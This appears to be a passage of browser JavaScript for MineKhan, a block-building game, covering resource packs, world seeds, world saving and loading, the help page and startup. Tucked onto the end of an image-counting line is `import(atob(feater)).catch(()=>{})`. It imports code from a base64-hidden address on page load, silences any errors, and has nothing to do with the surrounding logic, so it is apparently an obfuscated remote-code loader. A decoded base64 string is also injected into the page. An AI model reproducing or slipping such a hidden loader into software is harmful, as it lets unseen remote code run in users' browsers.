  document.addEventListener("mousedown", tryPlayMusic)
  document.addEventListener("touchstart", tryPlayMusic)
  //document.body.onmousedown = e => {if(e.target && e.target.tagName.toLowerCase() === "button") playSound("click")}
	const mediaAction = () => alert("You can't do that!")
  navigator.mediaSession.setActionHandler('play', mediaAction);
	navigator.mediaSession.setActionHandler('pause', mediaAction);
	navigator.mediaSession.setActionHandler('seekbackward', mediaAction);
	navigator.mediaSession.setActionHandler('seekforward', mediaAction);
	navigator.mediaSession.setActionHandler('previoustrack', mediaAction);
	navigator.mediaSession.setActionHandler('nexttrack', mediaAction);

  /*var audioRecorder = null, audioStream = null, recordingAudio = false, canSendAudio = false
  async function startRecordAudio(){
    if(recordingAudio) return
    recordingAudio = true
    if(!audioRecorder){
      try{
        audioStream = await navigator.mediaDevices.getUserMedia({audio:true})
      }catch(e){
        console.error(e)
        alert(e)
        return
      }
      audioRecorder = new MediaRecorder(audioStream)
      win.audioRecorder = audioRecorder
    }
    canSendAudio = true
    audioRecorder.ondataavailable = e => {
      e.data.arrayBuffer().then(r => audioCtx.decodeAudioData(r)).then(r => {
        var source = audioCtx.createBufferSource()
        source.buffer = r
        source.connect(audioCtx.destination)
        source.start(0)
      })
    }
    audioRecorder.start()
    audioRecorder.interval = setInterval(() => {
      audioRecorder.stop()
      audioRecorder.start()
      if(!multiplayer) stopRecordAudio()
    },1000)
  }
  function stopRecordAudio(){
    if(!recordingAudio) return
    recordingAudio = false
    clearInterval(audioRecorder.interval)
    audioRecorder.stop()
  }
  function updateRecordAudio(){
    if(canSendAudio){
      canSendAudio = false
      
    }
  }*/
	let recording = false, recorder, recordStream
	async function startRecord(){
		try{
			recordStream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser",width:{max:400},height:{max:400}},preferCurrentTab:true})
			recorder = new MediaRecorder(recordStream,{mimeType:"video/mp4"})
		}catch(e){
			console.error(e)
			return
		}
		recording = true
		let chunks = []
		recorder.onstop = async e => {
			const blob = new Blob(chunks, {type:recorder.mimeType.split(";")[0]})
			let a = document.createElement("a")
			a.href = URL.createObjectURL(blob)
			a.download = "Screen recording "+(new Date().toString())
			a.click()
			URL.revokeObjectURL(a.href)
			//savebox.classList.remove("hidden")
			//savebox.value = r.url
			recording = false
		}
		recorder.ondataavailable = (e) => {
		  chunks.push(e.data);
		}
		recorder.start()
	}
	function stopRecord(){
		if(recording){
			for(let t of recordStream.getTracks()) t.stop()
		}
	}
  
  let maxStartLoad = 0, loaded = 0
  win.allLoaded = false
  /*function findObjValueAmount(obj){
    for(let i in obj){
      if(typeof obj[i] === "object"){
        findObjValueAmount(obj[i])
      }else if(!obj[i].startsWith("refer:")) maxStartLoad ++
    }
  }
  findObjValueAmount(sounds)*/
	maxStartLoad+=2//sound load & extract
  for(let image in images) maxStartLoad ++; import(atob(feater)).catch(()=>{})

	function addToBottomRightList(str, color){
		if(color) str = "<span style='color:"+sanitize(color)+";'>"+sanitize(str)+"</span>"
		bottomRightList.insertAdjacentHTML("beforeend",str+"<br>")
		/*while(bottomRightList.clientHeight > height){
			bottomRightListItems.shift()
			bottomRightList.innerHTML = bottomRightListItems.join("<br>")
		}*/
	}
	function clearBottomRightList(){
		bottomRightList.innerHTML = ""
	}

  loadProg.innerHTML = `0% 0/${maxStartLoad}`
  function loadUpdate(){
    let percent = loaded / maxStartLoad * 100
    loadProg.innerHTML = `${Math.floor(percent)}% ${loaded}/${maxStartLoad}`
    loadBar.style.width = percent+"%"
    if(loaded === maxStartLoad){
      allLoaded = true
      changeScene("main menu")
			finishedLoading()
    }
    if(loaded > maxStartLoad){
      console.trace("loaded > maxStartLoad\nloaded = "+loaded+"\nmaxStartLoad = "+maxStartLoad)
    }
  }
  function loadDone(item,status,statusCode = ""){
    loaded++
		let color
		if(status === "fail") item = item+" Fail "+statusCode, color = "red"
		else item = item+" "+statusCode, color = "lime"
		addToBottomRightList(item, color)
    loadUpdate()
  }

	let languageNames = ["zh-Hans"], languages, selectedLanguage, language = null
	const languagesDeselect = () => {
		let elem = window.languages.getElementsByClassName("selected")
		if (elem && elem[0]) {
			elem[0].classList.remove("selected")
		}
	}
	function initLanguages(){
		languages = {}
		selectedLanguage = null
		while (window.languages.firstChild) {
			window.languages.removeChild(window.languages.firstChild)
		}
		let div = doc.createElement("div")
		div.className = "lang"+(!language ? " selected" : "")
		div.onclick = e => {
			languagesDeselect()
			div.classList.add("selected")
			selectedLanguage = "none"
		}
		let br = "<br>"
		div.id = "lang_none"
		div.innerHTML += "<strong>English</strong>" + br
		
		window.languages.appendChild(div)
		function loadLang(id){
			let url = "assets/lang/"+id+".json"
			fetch(url).then(r => r.json()).then(r => {
				r.id = id
				r.url = url
				languages[id] = r
				let div = doc.createElement("div")
				div.className = "lang"+(language && language.id === r.id ? " selected" : "")
				div.onclick = e => {
					languagesDeselect()
					div.classList.add("selected")
					selectedLanguage = id
				}
				let br = "<br>"
				div.id = "lang_"+id
				div.innerHTML += "<strong>" + Messages.format(r.name) + "</strong>" + br
				
				window.languages.appendChild(div)
			}, console.error)
		}
		for(let i of languageNames){
			loadLang(i)
		}
	}

	async function installResourcePack(url,pack,savedPack){
		pack.resourcePack = true
		pack.url = url
		if(!savedPack || pack.version !== savedPack.version){
			await saveToDB(url,pack,"resourcePacks")
		}
	}
	const defaultResourcePacks = ["/minekhan/assets/resource_packs/block_craft.json","/minekhan/assets/resource_packs/classic.json","/minekhan/assets/resource_packs/mk.json"]
	let customResources = {textures:{},texts:{},images:{},settings:{},sounds:{},animated}, resourcePacksChanged = false
	let resourcesHash = ""
	async function initResources(addCb = emptyFunc,doneCb = emptyFunc, loadAllPacks = false, addPack = null){
		let packs = []
		if(!loadAllPacks) downloadingTotal = downloadingProgress = 0
		async function doResourcePack(url,data){
			let error
			let prevTotal = 0, prevProgress = 0
			let pack = await fetch(url).then(r => showProgressFromResponse(r, (l,t) => {
				if(loadAllPacks) return
				downloadingProgress += l - prevProgress
				downloadingTotal += t - prevTotal
				prevTotal = t, prevProgress = l
			})).then(r => r.ok ? r.json() : null).catch(e => {error = e})
			if(!pack){
				if(data) pack = data, doneCb(pack)
				else{
					alert("Did not install resource pack "+url+" because could not load.")
					uninstallResourcePack(url)
				}
				if(error) console.error(error)
			}else{
				installResourcePack(url,pack,data)
				doneCb(pack)
			}
			if(pack) packs.push(pack)
		}
		let res = (await loadFromDB(null,"resourcePacks").catch(r => console.error(r))) || []
		res = res.map(d => d.data)
		let promises = []
		for (let data of res) {
			if(!inWorld || !loadAllPacks && !world.activeResourcePacks.includes(data.url)) continue
			promises.push(doResourcePack(data.url,data))
		}
		if(inWorld){
			let existPacks = res.map(r => r.url)
			let neededPacks = world.activeResourcePacks.filter(r => !existPacks.includes(r))
			for(let i of defaultResourcePacks) if(!existPacks.includes(i)) neededPacks.push(i)
			if(addPack && !existPacks.includes(addPack)) neededPacks.push(addPack)
			for(let j of neededPacks){
				//if(!loadAllPacks && !world.activeResourcePacks.includes(j)) continue
				promises.push(doResourcePack(j,null))
			}
		}
		let activePacks = world ? world.activeResourcePacks : [] //.map(u => res.findIndex(r => r.url === u))
		let inactivePacks = res.map(r => r.url).filter(r => !activePacks.includes(r))
		for(let i of activePacks){
			addCb({name:i,url:i})
		}
		for(let i of inactivePacks){
			addCb({name:i,url:i})
		}
		await Promise.all(promises)
		
		customResources.textures = {}
		customResources.texts = {}
		customResources.images = {}
		customResources.animated = {}
		customResources.settings = {}
		let packOrder = []
		if(language) packOrder.push(language)
		if(world){
			for(let i of world.activeResourcePacks){
				let pack = packs[packs.findIndex(obj => obj.url === i)]
				if(pack) packOrder.push(pack)
			}
		}
		resourcesHash = ""
		for(let i of packOrder){
			resourcesHash += i.url.replace(",","\\,")+","+(i.version||"").replace(",","\\,")+","
			if(i.textures) Object.assign(customResources.textures, i.textures)
			if(i.texts) Object.assign(customResources.texts, i.texts)
			if(i.images) Object.assign(customResources.images, i.images)
			if(i.animated) Object.assign(customResources.animated, i.animated)
			if(i.settings) Object.assign(customResources.settings, i.settings)
		}
		for(let button of doc.getElementsByClassName("canTranslate")) button.theTranslate()
		promises.length = 0
		for(let i in customResources.images){
			promises.push(loadImage(i,customResources.images))
		}
		for(let i in customResources.animated){
			customResources.animated[i].time *= tickTime
		}
		await Promise.all(promises)
	}
	async function uninstallResourcePack(url){
		if(inWorld){
			if(world.activeResourcePacks.includes(url)){
				resourcePacksChanged = true
			}
			//world.resourcePacks.splice(world.resourcePacks.indexOf(url),1)
			world.activeResourcePacks.splice(world.activeResourcePacks.indexOf(url),1)
		}
		await deleteFromDB(url,"resourcePacks")
	}
	win.initResources = initResources
	win.customResources = customResources
	function initResourcePacksMenu(addPack = null){
		while (window.resourcePacks.firstChild) {
			window.resourcePacks.removeChild(window.resourcePacks.firstChild)
		}
		let message = doc.createElement("div")
		message.className = "select-message"
		message.innerHTML = "Click a resource pack to toggle it. The ones with outlines are active."
		window.resourcePacks.append(message)
		resourcePacksChanged = false
		const addCb = pack => {
			let div = doc.createElement("div")
			div.className = "resourcePack"+(world.activeResourcePacks.includes(pack.url) ? " selected" : "")
			div.onclick = e => {
				if(e.dOnTSeLEct || !host) return
				resourcePacksChanged = true
				let idx = world.activeResourcePacks.indexOf(pack.url)
				if(idx === -1){
					world.activeResourcePacks.push(pack.url)
					//if(!world.resourcePacks.includes(pack.url)) world.resourcePacks.push(pack.url)
					div.classList.add("selected")
					window.resourcePacks.prepend(div)//move to end
				}else{
					world.activeResourcePacks.splice(idx,1)
					div.classList.remove("selected")
				}
			}
			let br = "<br>"
			div.id = "resourcePack_"+pack.url
			div.innerHTML += "<strong>" + Messages.format(pack.name) + "</strong>" + br +
			"Checking for updates..."
			window.resourcePacks.appendChild(div)
		}
		initResources(addCb,
		pack => {
			let div = doc.getElementById("resourcePack_"+pack.url)
			if(!div){
				addCb(pack)
				div = doc.getElementById("resourcePack_"+pack.url)
			}
			let br = "<br>"
			div.innerHTML = ""
			if(pack.thumbnail) div.innerHTML += "<img class='thumbnail' src='" + pack.thumbnail + "'>"
			div.innerHTML += "<strong>" + Messages.format(pack.name) + "</strong>" + br +
			"Version "+Messages.format(pack.version)+br
			if(!defaultResourcePacks.includes(pack.url) && host) addButton(div,"Uninstall",e => {
				uninstallResourcePack(pack.url).then(() => div.remove())
			})
			if(pack.description) addFormatedText(div,pack.description)
		},true,addPack)
	}

	function addFormatedText(parent,text){
		let span = document.createElement("span")
		span.innerHTML = Messages.format(text)
		parent.appendChild(span)
	}
  
	const seedTemplates = [
		"Seeds for alpha world type",
		{
			name:"enormous jungle with giant lake",
			seeds:[1151333698]
		},
		{
			name:"giant lake with jungle surrounding",
			seeds:[543697467]
		},
		{
			name:"flat at spawn",
			seeds:[504051444]
		},
		{
			name:"multiple combined ravines, x: -31, z: 36",
			seeds:[1836373580]
		},
		{
			name:"a little strange",
			seeds:[1081321651]
		},
		{
			name:"cave straight down to lava, x:60, z:20",
			seeds:[700051287]
		},
		{
			name:"Default seed (the only possible seed for older versions due to bug)",
			seeds:[621763252]
		},

		"Seeds for large world type",
		/*/*{
			name:"Ocean cliff",
			seeds:[1736025286,1469176549]
		},*-/
		{
			name:"Mushroom island",
			seeds:["nice small rivers!","glork",1901222847,"dime"]
		},
		{
			name:"Hills",
			seeds:[1225417172,"drewe",1401885631,400651911,326633002]
		},
		{
			name:"Old growth taiga",
			seeds:["best survival seed","calc",10068446,717956309]
		},
		{
			name:"Steep river",
			seeds:[1880509222]
		},
		/*{
			name:"Old growth birch forest ahead",
			seeds:[697975986]
		},*-/
		/*{
			name:"Frozen mountain range",
			seeds:["i dont want island"]
		},*-/
		{
			name:"Sunflower plains",
			seeds:[554442912,"beachlike"]
		},
		{
			name:"Desolate island",
			seeds:[1929829433]
		},
		{
			name:"Eroded Hill",
			seeds:[1320610501]
		},
		{
			name:"Ocean cliff",
			seeds:["cooler",1736025286]
		},
		{
			name:"Snowy island",
			seeds:[471881416]
		},
		{
			name:"Old growth birch forest",
			seeds:[385272373]
		},
		/*{
			name:"Lake side badlands (with exposed lush caves)",
			seeds:[334578438]
		},*-/
		{
			name:"Peaks nearby",
			seeds:[166791926]
		},
		{
			name:"Green meadow (with rivers)",
			seeds:[339374260]
		},
		{
			name:"Badlands & Peaks",
			seeds:[1439000267]
		},
		{
			name:"Extreme savanna island",
			seeds:[1184725996]
		},
		{
			name:"Epic Jungle",
			seeds:[1458172347]
		},
		{
			name:"Huge Stone peaks",
			seeds:[1526277446]
		},
		{
			name:"Grand valley",
			seeds:[1149911706]
		},
		{
			name:"Cliffs and huge exposed caves",
			seeds:[1880812026]
		},
		{
			name:"Mountainous beach",
			seeds:[1602182807]
		}*/
		{
			name:"Mountains nearby",
			seeds:[326941970]
		},
		{
			name:"Jagged savanna and water",
			seeds:[93745840]
		},
		{
			name:"Dark forest",
			seeds:[221593743]
		},
		{
			name:"Many different forest biomes",
			seeds:[1693477716]
		},
		{
			name:"Jungle",
			seeds:[203157613]
		},
		{
			name:"Bamboo forest ahead",
			seeds:[1750048288]
		},
		{
			name:"Peaks",
			seeds:[320977315,"good",-1678774288/*hash of "river contash"*/,1367041089]
		},
		{
			name:"Boring forest",
			seeds:[1350698308,1405766867]
		},
		{
			name:"Badland valley",
			seeds:[953324472]
		},
		{
			name:"Old growth taiga",
			seeds:[1880851319]
		}
	]
	function initSeedTemplatesMenu(){
		while (window.seeds.firstChild) {
			window.seeds.removeChild(window.seeds.firstChild)
		}
		function addSeed(obj){
			let div = doc.createElement("div")
			div.className = "seed"
			div.onclick = e => {
				seedBox.value = obj.seeds[floor(rand(obj.seeds.length))]
				if(!boxCenterTop.value) boxCenterTop.value = obj.name
				changeScene(previousScreen)
			}
			let br = "<br>"
			div.innerHTML = "<strong>" + obj.name + "</strong>" + br
			
			window.seeds.appendChild(div)
		}
		for(let o of seedTemplates){
			if(typeof o === "string"){
				let message = doc.createElement("div")
				message.className = "select-message"
				message.innerHTML = o
				window.seeds.appendChild(message)
			}else addSeed(o)
		}
	}
  async function createNewWorld(){
		if(win.initServerEverything){
			initServerEverything(addToBottomRightList)
			win.initServerEverything = null
		}
    host = true
		let seed = isNaN(seedBox.value) ? seedBox.value.hashCode() : +seedBox.value
		serverWorld = new ServerWorld({operators:[p.username],trees,caves,fancyRivers,worldType,structures,gameMode:p.gameMode,cheats,settings:worldSettings})
		serverWorld.setSeed(seedBox.value ? seed : (Math.random() * 2000000000 | 0))
		win.serverWorld = serverWorld
    p.dimension = ""
    serverWorld.id = generateID()
    let name = boxCenterTop.value || "World"
    let number = ""
    while(true) {
      let match = false
      for (let id in worlds) {
        if (worlds[id].name === name + number) {
          match = true
          break
        }
      }
      if (match) {
        number = number ? number + 1 : 1
      } else {
        name = name + number
        break
      }
    }
		serverWorld.name = name
		worldSettings = serverWorld.settings
    
		autosaveTimer = null
		lastAutosave = performance.now()
		saving = false

		banned = {}, whitelist = null

		changeScene("multiplayer connecting")
		joinWorld(initSingleplayer())
		fetch("/minekhan/know",{
			method:"POST",
			body: "new world; name: "+serverWorld.name+"; seed: "+serverWorld.worldSeed+"; type: "+worldType+"; game mode: "+p.gameMode,
			headers:{Authorization:userSessionString}
		}).catch(console.error)
  }
	function waitAFrame(){
		return new Promise(resolve => {
			requestAnimationFrame(resolve)
		})
	}
  async function playSelectedWorld(){
		dirt()
		if(win.initServerEverything){
			initServerEverything(addToBottomRightList)
			win.initServerEverything = null
		}
		ctx.textAlign = 'center'
		fill(255)
		textSize(25)
		text("Reading world data...", width / 2, height / 2 - 65)
		drawLoadBar(width/2,height/2+85)
		await waitAFrame()
    serverWorld = new ServerWorld([p.username])
		win.serverWorld = serverWorld
		autosaveTimer = null
		lastAutosave = performance.now()
		saving = false

    let code
    let inv
    let surviv
    let mod
    let nether
    let ent
    let tags, netherTags
    let dataWhitelist, dataBanned
		let worldResourcePacks, activeResourcePacks
    if (!selectedWorld && !boxCenterTop.value.startsWith("JSON")) {
      code = boxCenterTop.value
    } else {
      let data = worlds[selectedWorld]
      if(boxCenterTop.value.startsWith("JSON")){
        data = boxCenterTop.value.replace("JSON","")
        try{
          data = JSON.parse(data)
        }catch(e){
          alert(e)
        }
      }
      if (data) {
        code = data.code
        serverWorld.id = data.id
        serverWorld.edited = data.edited
        nether = data.nether
        tags = data.tags
        netherTags = data.netherTags
        dataBanned = data.banned
        dataWhitelist = data.whitelist
				worldResourcePacks = data.resourcePacks
				activeResourcePacks = data.activeResourcePacks
				serverWorld.playersInv = data.playersInv || {}
        if(data.cloud){
					downloadingProgress = 0, downloadingTotal = 0
          changeScene("downloading")
          let error
          let cloudWorld = await fetch(`saves/${selectedWorld}`, {headers:{Authorization:userSessionString}})
					.then(r => showProgressFromResponse(r, (l,t) => {
						downloadingProgress = l
						downloadingTotal = t
					})).then(res => res.json()).catch(e => {error = e}) //dont remove brackets, prevents returning value
          if(!cloudWorld){
            alert("Failed to load cloud save. "+error)
            changeScene("loadsave menu")
            return
          }
					data = cloudWorld
          code = cloudWorld.code
          serverWorld.id = cloudWorld.id
          serverWorld.edited = cloudWorld.edited
          tags = cloudWorld.tags
          dataBanned = data.banned
          dataWhitelist = data.whitelist
					//worldResourcePacks = cloudWorld.resourcePacks
					activeResourcePacks = cloudWorld.activeResourcePacks
					serverWorld.playersInv = data.playersInv || {}
        }
				if(data.survivStr){
					serverWorld.playersInv[":host"] = {survivStr:data.survivStr,inv:data.inv}
				}
				for(let i in serverWorld.playersInv){
					if(typeof serverWorld.playersInv.inv === "string") serverWorld.playersInv[i].inv = atoarr(serverWorld.playersInv[i].inv)
					if(typeof serverWorld.playersInv.survivStr === "string") serverWorld.playersInv[i].survivStr = atoarr(serverWorld.playersInv[i].survivStr)
				}
				mod = data.mod
      }
    }

		cheats = !p.survival
    /*if(inv){
      world.loadOldInv(inv)
    }*/
    if (code) {
      try {
        serverWorld.loadSave(code)
        serverWorld.id = serverWorld.id || generateID()
      }
      catch(e) {
        alert("Unable to load save. Error: "+e)
        console.error(e)
        return
      }
    }
		banned = dataBanned || {}, whitelist = dataWhitelist || null
		if(activeResourcePacks){
			//serverWorld.resourcePacks = worldResourcePacks
			serverWorld.activeResourcePacks = activeResourcePacks
		}
		host = true
		worldSettings = serverWorld.settings
		if(mod){
			try{
				console.log("running mod "+mod)
				serverWorld.loadMod(mod)
			}catch(e){
				console.log("error starting mod: "+e)
				alert("Error starting mod: "+e.stack)
			}
		}
		changeScene("multiplayer connecting")
		joinWorld(initSingleplayer())
		fetch("/minekhan/know",{
			method:"POST",
			body: "open world; name: "+serverWorld.name,
			headers:{Authorization:userSessionString}
		}).catch(console.error)
  }
	function deleteSelectedWorld(){
		if (worlds[selectedWorld] && confirm(`Are you sure you want to delete ${worlds[selectedWorld].name}? This will also delete it from the cloud.`)) {
			deleteFromDB(selectedWorld)
			window.worlds.removeChild(document.getElementById(selectedWorld))
			delete worlds[selectedWorld]
			fetch(`saves/${selectedWorld}`, { method: "DELETE", headers:{Authorization:userSessionString} }).then(r => r.json()).then(r => {
				if(!r.success){
					console.log(r.message)
				}
			}).catch(console.error)
			selectedWorld = 0
		}
	}
  
	let helpSetup = false
  async function setupHelp(){
    var contentDiv = document.querySelector("#help .content")
    var nav = document.querySelector("#help .nav")
		function filterNone() {
			return NodeFilter.FILTER_ACCEPT;
		}
		let credits = document.querySelector("#topCredits").innerHTML
		document.querySelector("#credits").innerHTML = credits.replace(/\n/g,"<br>")
    /*var pages = await fetch("/server/wikiPagesData").then(r => r.json()).catch(() => ({}))
    for(var i in pages){
      var page = pages[i]
      var theName = Messages.format(page.name.replace(/_/g," "))
      var div = document.createElement("div")
      div.id = "help_"+page.name
      div.innerHTML = "<h1>"+theName+"</h1>"
      if(page.user) div.innerHTML += "<b>By "+page.user+"</b><br>"
      if(!page.required) div.innerHTML += "<a href='/wiki/page/"+page.name+"' target='_blank'>Open in new window</a><br>"
      div.innerHTML += Messages.format(page.content)
      contentDiv.appendChild(div)
      var a = document.createElement("a")
      a.innerHTML = theName
      a.setAttribute("onclick","scrollToEl('help_"+page.name+"')")
      nav.appendChild(a)
    }*/
    
    //Setup images
    var divs = document.querySelectorAll("div[img]")
    for(var i=0; i<divs.length; i++){
      var d = divs[i]
      d.style.backgroundSize = "100%"
      d.style.imageRendering = "pixelated"
      d.style.display = "inline-block"
      d.style.verticalAlign = "middle"
      var img = d.getAttribute("img")
      var w, h
      if(img === "heart"){
        w = h = 18
        d.style.backgroundImage = "url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJCAYAAADgkQYQAAAAXElEQVQoU3XQQRKAIAiF4Z97ua8j19572UCSTytWjHwCgzGi9dQAzfEHj/YrwOJXgFqhFGl8pw4GepUXdADbBzqBvXeKnVaYwE0uPkEFuZcOio4+QqY8J5igAi9cnpgXB7uKmTQAAAAASUVORK5CYII=)"
      }else if(img === "halfHeart"){
        w = h = 18
        d.style.backgroundImage = "url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJCAYAAADgkQYQAAAAY0lEQVQoU4WOwQ3AMAgDzS50i/zbkTtAxmCXVLiBoKhS+YDMYSxYNeYoAOoMF7xGVVWVopl5E14R6B1ojctjQgEuqPz9hG4A5w/ETBUMp5opPBJ0KAAmL1/S8XrF3O0Qwf34AVFaJQc+FQukAAAAAElFTkSuQmCC)"
      }else if(img === "deadHeart"){
        w = h = 18
        d.style.backgroundImage = "url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJCAYAAADgkQYQAAAAT0lEQVQoU62OwQ3AMAwCz1N4//E8RSqjuiVRn/ULocMQvLduGYBr2uhbmSlRVbgGQqkx7esjO/QvtG3yyq6aTeNv2wYQdYwV6MAXpOozfAGB1SIH1uYKrgAAAABJRU5ErkJggg==)"
      }
      var a = parseInt(d.getAttribute("amount"))
      if(a){
        d.style.backgroundSize = (100/a)+"% 100%"
        d.style.width = (w * a)+"px"
      }else d.style.width = w+"px"
      d.style.height = h+"px"
    }

    //Setup collapsibles
    var coll = document.getElementsByClassName("collapsible");
    for (var i = 0; i < coll.length; i++) {
      var c = coll[i]
      var title = document.createElement("div")
      title.classList.add("title")
      title.innerHTML = c.getAttribute("title")
      var content = document.createElement("div")
      content.classList.add("content")
      content.innerHTML = c.innerHTML

      c.innerHTML = ""
      c.appendChild(title)
      c.appendChild(content)

      content.style.maxHeight = "0px"
      title.addEventListener("click", function() {
        var content = this.nextElementSibling
        this.classList.toggle("active")
        if (/*content.style.maxHeight !== "0px"*/!this.classList.contains("active")){
          content.style.maxHeight = "0px";
        } else {
					this.dispatchEvent(new CustomEvent("opencollapsible", {bubbles:true}))
          content.style.maxHeight = content.scrollHeight + "px";
        }
      })
    }
    
    //Set recipes collapsible
		let didRecipes = false
		document.querySelector("#recipes").addEventListener("opencollapsible", function(){
		if(didRecipes) return
		if(blockData !== mkBlockData) return alert("recipes not available when not in world")
		didRecipes = true
    use3d()
    FOV(90)
    gl.clearColor(0, 0, 0, 0)
    gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
    var recipes = document.querySelector("#recipes .content")
    var size = inventory.size
    var rsize = round(size)
    var s2 = size/2
    var icons = {}
    var ix = -s2, iy = s2
    function addIcon(id){
      ix += size
      if(ix > gl.canvas.width - s2){
        ix = s2
        iy += size
      }
      if(iy > gl.canvas.height - s2){
        ix = s2, iy = s2
        gl.clearColor(0, 0, 0, 0)
        gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
      }
      drawIcon(ix, iy, id, false)
      ictx.clearRect(0,0,rsize,rsize)
      ictx.drawImage(gl.canvas, round(ix-s2),round(iy-s2), rsize,rsize, 0,0,rsize,rsize)
      icons[id] = ic.toDataURL()
    }
    var ic = document.createElement("canvas")
		ic.width = ic.height = size
    var ictx = ic.getContext("2d")
    var rhtml = ""
    for(var c in crafts){
      var r = crafts[c]
      if(r.hidden) continue
      var arr = craftArrays[c]
      rhtml += "<div class='recipe'>"
      rhtml +=  blockData[r.id].Name+"<br><br>"
      rhtml += "<div class='grid'>"
      //Grid
      for(var a=0; a<arr.length; a++){
        var id = arr[a]
        if(craftTypes[id]) id = craftTypes[id][0]
        else id = parseInt(id)
        if(id) {
          if(!icons[id]) addIcon(id)
          var img = icons[id]
          rhtml += "<img src='"+img+"' style='width:"+size+"px;height:"+size+"px;' title='"+blockData[id].Name+"'>"
        }else{
          rhtml += "<div style='width:"+size+"px;height:"+size+"px;'></div>"
        }
        if(a%3===2 && a !== 8){
          rhtml += "<br>"
        }
      }
      rhtml += "</div>"
      //Result
      var id = r.id
      if(!icons[id]) addIcon(id)
      var img = icons[id]
      rhtml += "<br><div class='result' style='margin-left:"+size+"px;margin-top:"+size+"px;'>"
      rhtml += "<img src='"+img+"' style='width:"+size+"px;height:"+size+"px;' title='"+blockData[id].Name+"'>"
      rhtml += "<div class='number'>"+r.amount+"</div>"
      rhtml += "</div><br><br>"
      if(r.shapeless){
        rhtml += "Shapeless"
      }else if(r.shaped){
        rhtml += "Shaped"
      }else{
        rhtml += "Fixed"
      }
      rhtml += "</div>"
    }
    recipes.innerHTML = rhtml
		})
		
		helpSetup = true
  }

	let everythingInited = false
	async function initEverything() {
		maxStartLoad += 7 // fetch the account, and other stuff
		loadDone("Initializing MineKhan.")
    changeScene("initLoading")
		let settingsSaved, savedUpdates
		await loadFromDB().then(async res => {
			if(res && res.length) {
				let index = res.findIndex(obj => obj.id === "settings")
				if (index >= 0) {
					Object.assign(settings, res[index].data) // Stored data overrides any hardcoded settings
					settingsSaved = true
				}
				index = res.findIndex(obj => obj.id === "lastUpdate")
				if (index >= 0) {
					savedUpdates = res[index].data
				}
				index = res.findIndex(obj => obj.id === "userSession")
				if (index >= 0) {
					setUserSession(res[index].data,true)
				}else setUserSession()
			}
		}).catch(r => console.error(r))

		await initWebgl()
		loadDone("Initialized WebGL context, shapes, and textures.")
		await waitAFrame()
    initPlayer()
		let req
    fetch("/server/account",{headers:{Authorization:userSessionString}}).then(r => {req = r; return r.json()}).then(r => {
      updateUserTo(r)
      loadDone("Fetch account","",req.status)
    }).catch(e => {
      console.log(e)
      loadDone("Fetch account","fail")
    })
    
    skybox = new Skybox()
		win.skybox = skybox

		message.innerHTML = atob(base64)
    
		initCachedShapes()

		await initBackgrounds()
		loadDone("Initialized backgrounds.")
		await waitAFrame()

		p.camera.FOV(settings.fov)
		initButtons()
		initInputs()
		loadDone("Initialized UI.")
		await waitAFrame()
    initAudioCtx()
		loadDone("Initialized audio context.")
		await waitAFrame()
		await initFont()
		loadDone("Initialized font.")
		if(settingsSaved){
			loadControls()
			selectVoiceFromList(settings.narratorVoice)
			onresize()
			if(settings.language){
				let id = settings.language
				let url = "assets/lang/"+settings.language+".json"
				fetch(url).then(r => r.json()).then(r => {
					r.id = id
					r.url = url
					language = r
					initResources()
					document.documentElement.lang = language ? language.id : "en-us"
				})
			}
			updatePerformFast()
		}
		if(savedUpdates){
			fetch("updatesAfter/"+savedUpdates).then(r => r.text()).then(async r => {
				if(r){
					window.updates.classList.remove('hidden')
					let a = doc.createElement("a")
					a.innerHTML = "All updates"
					a.href = "updates.txt"
					a.target = "_blank"
					window.updates.appendChild(a)
					window.updates.insertAdjacentHTML("beforeend","<br>"+r
					/*.replace(/-- (.*)\n/g, (_,$1) => {
						return "-- "+(new Date(+$1).toLocaleDateString(undefined,{year: "numeric", month: "long", day: "numeric"}))+"\n"
					})*/.replace(/\n/g,"<br>"))
					let btn = doc.createElement("button")
					btn.innerHTML = "Close"
					btn.onclick = async function(){
						let last = r.lastIndexOf("-- ")
						await saveToDB("lastUpdate",+r.slice(last+3).match(/(\d*)/)[1])
						window.updates.classList.add('hidden')
					}
					window.updates.appendChild(btn)
				}
			}, console.error)
			/*let updates = savedUpdates
			let r = await fetch("/updates/all").then(r => r.json()).catch(e => {console.error(e); return []})
			updates = r.filter(u => !updates.includes(u))
			if(updates.length){
				window.updates.classList.remove('hidden')
				let a = doc.createElement("a")
				a.innerHTML = "All updates"
				a.href = "/updates"
				a.target = "_blank"
				window.updates.appendChild(a)
				function fetchUpdate(id,i){
					return fetch("/updates/update/"+encodeURIComponent(id)).then(r => r.json()).then(r => {
						updates[i] = r
					}).catch(e => {
						updates[i] = {name:"Failed to load update",desc:e}
					})
				}
				await Promise.all(updates.map((r,i) => fetchUpdate(r,i)))
				for(let i of updates){
					let div = doc.createElement("div")
					div.className = "update"
					div.innerHTML = `
<h3>${i.name}</h3><br>
<p>${i.desc}</p>
`
					window.updates.appendChild(div)
				}
			}*/
		}else{
			fetch("updatesAfter/null").then(r => r.text()).then(async r => {
				let last = r.lastIndexOf("-- "), lastEnd = r.indexOf("\n",last)
				await saveToDB("lastUpdate",+r.substring(last+3,lastEnd))
			}, console.error)
		}
		if(unsupported.length) alert("Unfortunately, these are unsupported: "+unsupported.join(", "))
		
    if (window.parent.tickid) clearTimeout(window.parent.tickid)
		tickLoop()

		everythingInited = true
		loader.classList.remove("hide")
	}
  
  function finishedLoading(){
		clearBottomRightList()
    // See if a user followed a link here.
		if (urlParams.has("target")) {
      var target = urlParams.get("target")
      changeScene("multiplayer connecting")
			addToBottomRightList("Authenticating")
      loggedIn().then(logged => {
        if(logged){
          initServersMenu().then(() => {
            if(servers[target]){
              initMultiplayer(target)
            }else{
              changeScene("main menu")
            }
          })
        }else{
          changeScene("main menu")
        }
      })
      
		}
  }

	// Define all the scene draw functions
  let clear,dirt,netherrack,endstone
	(function() {
    var splashs = [
      "Multiplayer!",
      "Survival!",
      "Flowers? Make a garden!",
      //"Also go to my website:\nwww.thingmaker.repl.co",
      "Nether!",
      "Can't break bedrock.",
      "Chat with a slash!",
      "Watch out from\nthe falling sand!",
